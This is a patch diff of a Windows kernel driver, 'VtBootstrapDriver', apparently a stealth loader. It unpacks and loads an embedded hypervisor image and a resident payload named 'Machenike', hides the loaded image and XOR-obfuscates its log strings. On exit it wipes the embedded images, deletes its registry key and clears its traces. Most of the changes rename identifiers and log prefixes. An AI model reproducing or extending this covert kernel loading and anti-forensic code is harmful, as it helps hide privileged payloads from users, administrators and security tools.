+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] pre-load cleanup done hv_ready=%d\n"), (int)pre_load_hv_ready);
 
     if (pre_load_hv_ready)
     {
+        mapctl_status st = {};
+        if (mapdriver_query_payload_status(&st.payload))
+        {
+            if (st.payload.payload_machenike_loaded != 0 && st.payload.payload_machenike_base != 0)
+            {
+                Utils::machenikeBase = (PVOID)st.payload.payload_machenike_base;
+                Utils::machenikeSize = (ULONG)st.payload.payload_machenike_size;
+                Utils::machenikeMode = (ULONG)st.payload.payload_machenike_mode;
+                Utils::machenikeUsedIndependent = (BOOLEAN)st.payload.payload_machenike_used_indep;
+                Utils::machenikeUnload = (PDRIVER_UNLOAD)st.payload.payload_machenike_driver_unload;
+                Utils::machenikeLoaded = TRUE;
+                Utils::payloadBase = (PVOID)st.payload.image_base;
+                Utils::payloadSize = (ULONG)st.payload.image_size;
+                Utils::payloadArenaBase = (PVOID)st.payload.arena_base;
+                Utils::payloadArenaSize = (ULONG)st.payload.arena_size;
+                Utils::testDriverUnloaded = TRUE;
+                Utils::testDriverImageQuarantined = TRUE;
+                _InterlockedExchange(&g_payload_detached, 1);
+                _InterlockedExchange(&g_bootstrap_lightweight_unload_armed, 1);
+
+                LOG_DEBUG(_XOR_("[VtBootstrapDriver] Restored resident Machenike: base=%p size=0x%X mode=%u unload=%p\n"),
+                    Utils::machenikeBase, Utils::machenikeSize, Utils::machenikeMode, Utils::machenikeUnload);
+
+                if (mapdriver_create_control_device(DriverObject))
+                {
+                    LOG_DEBUG(_XOR_("[VtBootstrapDriver] Control device restored for resident runtime\n"));
+                    return STATUS_SUCCESS;
+                }
+            }
+        }
+
         mapctl_full_unload stale = {};
         bool stale_stop_used = false;
         __try
@@ -7646,23 +7892,23 @@ static NTSTATUS mapdriver_driver_main_body(
 
         if (!mapdriver_hv_ready())
         {
-            LOG_DEBUG(_XOR_("[mapDriver] stale resident HV stopped during fresh load self=0x%llX ack=0x%llX exc=0x%llX\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] stale resident HV stopped during fresh load self=0x%llX ack=0x%llX exc=0x%llX\n"),
                 stale.selfstop_result,
                 stale.selfstop_ack,
                 stale.selfstop_exceptions);
         }
         else
         {
-#if MAPDRIVER_IMAGE_WIPE_ENABLED
+#if VT_IMAGE_WIPE_ENABLED
             RtlSecureZeroMemory(test_sys, sizeof(test_sys));
 #endif
             mapdriver_clear_traces(driver_name, true);
-            LOG_DEBUG(_XOR_("[mapDriver] hv already ready, stale self-stop failed used=%d self=0x%llX ack=0x%llX exc=0x%llX\n"),
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] hv already ready, stale self-stop failed used=%d self=0x%llX ack=0x%llX exc=0x%llX\n"),
                 (int)stale_stop_used,
                 stale.selfstop_result,
                 stale.selfstop_ack,
                 stale.selfstop_exceptions);
-#if MAPDRIVER_FAIL_LOAD_IF_HV_ALREADY_READY
+#if VT_BOOT_FAIL_IF_ALREADY_READY
             mapdriver_delete_control_device();
             if (DriverObject)
                 DriverObject->DriverUnload = nullptr;
@@ -7678,44 +7924,44 @@ static NTSTATUS mapdriver_driver_main_body(
     ULONG test_image_size = 0;
     if (mapdriver_unpack_test_sys(&test_image, &test_image_size))
     {
-        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack ok size=0x%X\n"), test_image_size);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor unpack ok size=0x%X\n"), test_image_size);
         if (mapdriver_load_testdriver(test_image))
         {
-            LOG_DEBUG(_XOR_("[mapDriver] TestDriver load ok base=%p size=0x%X\n"), Utils::imageBase, Utils::imageSize);
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor load ok base=%p size=0x%X\n"), Utils::imageBase, Utils::imageSize);
             mapdriver_save_testdriver_image_base();
             mapdriver_apply_testdriver_hide_lock();
             bool payload_ok = mapdriver_load_resident_payload_expanded();
-#if MAPDRIVER_AUTO_LOAD_MACHENIKE_ON_BOOT
+#if VT_BOOT_AUTO_LOAD_MACHENIKE_ON_BOOT
             if (payload_ok)
             {
                 bool machenike_ok = mapdriver_load_machenike(DriverObject, RegistryPath, FALSE);
-                LOG_DEBUG(_XOR_("[mapDriver] Machenike embedded auto-load ok=%d base=%p size=0x%X\n"),
+                LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike embedded auto-load ok=%d base=%p size=0x%X\n"),
                     (int)machenike_ok, Utils::machenikeBase, Utils::machenikeSize);
             }
 #endif
-#if MAPDRIVER_AUTO_ONEKEY_LOAD
+#if VT_BOOT_AUTO_ONEKEY_LOAD
             if (payload_ok)
             {
-#if MAPDRIVER_AUTO_ONEKEY_USE_THREAD
+#if VT_BOOT_USE_THREAD
                 mapdriver_start_onekey_worker();
 #else
                 bool onekey_ok = mapdriver_run_onekey_expanded(DriverObject);
-                LOG_DEBUG(_XOR_("[mapDriver] onekey sync leave ok=%d\n"), (int)onekey_ok);
+                LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey sync leave ok=%d\n"), (int)onekey_ok);
                 if (!onekey_ok)
                     final_status = STATUS_DEVICE_NOT_READY;
 #endif
             }
 #endif
-#if MAPDRIVER_AUTO_HANDOFF_AFTER_PAYLOAD
+#if VT_BOOT_AUTO_HANDOFF_AFTER_PAYLOAD
             if (payload_ok)
             {
-                LOG_DEBUG(_XOR_("[mapDriver] auto handoff after payload start %d\n"), 1);
+                LOG_DEBUG(_XOR_("[VtBootstrapDriver] auto handoff after payload start %d\n"), 1);
                 mapdriver_unload_common(DriverObject, true);
             }
 #endif
             if (NT_SUCCESS(final_status) || final_status == STATUS_UNSUCCESSFUL)
             {
-#if MAPDRIVER_AUTO_ONEKEY_LOAD && !MAPDRIVER_AUTO_ONEKEY_USE_THREAD && MAPDRIVER_AUTO_ONEKEY_RETURN_FAILURE
+#if VT_BOOT_AUTO_ONEKEY_LOAD && !VT_BOOT_USE_THREAD && VT_BOOT_AUTO_ONEKEY_RETURN_FAILURE
                 final_status = STATUS_UNSUCCESSFUL;
 #else
                 final_status = STATUS_SUCCESS;
@@ -7724,7 +7970,7 @@ static NTSTATUS mapdriver_driver_main_body(
         }
         else
         {
-            LOG_DEBUG(_XOR_("[mapDriver] TestDriver load failed %d\n"), 0);
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor load failed %d\n"), 0);
             if (!mapdriver_hv_ready())
                 Utils::FreePayloadArena();
         }
@@ -7733,12 +7979,12 @@ static NTSTATUS mapdriver_driver_main_body(
     }
     else
     {
-        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack failed %d\n"), 0);
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] VtHypervisor unpack failed %d\n"), 0);
     }
 
-#if MAPDRIVER_IMAGE_WIPE_ENABLED
+#if VT_IMAGE_WIPE_ENABLED
     RtlSecureZeroMemory(test_sys, sizeof(test_sys));
-#if MAPDRIVER_AUTO_LOAD_MACHENIKE_ON_BOOT
+#if VT_BOOT_AUTO_LOAD_MACHENIKE_ON_BOOT
     RtlSecureZeroMemory(machenike_sys, sizeof(machenike_sys));
 #endif
 #endif
@@ -7749,14 +7995,14 @@ static NTSTATUS mapdriver_driver_main_body(
             DriverObject->DriverUnload = nullptr;
         g_host_driver_object = nullptr;
     }
-#if MAPDRIVER_AUTO_ONEKEY_LOAD && MAPDRIVER_AUTO_ONEKEY_DROP_MAP_CTL
+#if VT_BOOT_AUTO_ONEKEY_LOAD && VT_BOOT_DROP_CONTROL_DEVICE
     else
     {
         mapdriver_delete_registry_key(RegistryPath);
     }
 #endif
     mapdriver_clear_traces(driver_name, true);
-    LOG_DEBUG(_XOR_("[mapDriver] DriverMain leave final_status=0x%08X\n"), final_status);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] DriverMain leave final_status=0x%08X\n"), final_status);
     return final_status;
 }
 
